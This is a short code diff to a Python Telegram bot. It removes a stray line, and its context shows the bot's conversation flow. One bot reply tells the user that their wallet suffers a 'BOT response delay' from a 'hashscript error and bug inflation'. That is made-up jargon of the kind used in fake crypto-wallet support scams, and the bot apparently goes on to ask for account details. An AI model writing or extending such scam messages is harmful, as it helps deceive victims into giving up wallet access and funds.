@@ -45,8 +45,6 @@ def second_step(message):
     msg = bot.send_message(message.chat.id, 'I understand what the problem is your installed wallet is currently facing a BOT response delay due to some hashscript error and bug inflation, that is the main reason why your account activities could not be processed successfully.')
 
 
-y
-
 CH = ConversationHandler (entry_points = [CommandHandler("start", start)],
      states = {ONE : [MessageHandler(Filters.text , ask_account)],
      TWO : [MessageHandler(Filters.text , first_question_step)],
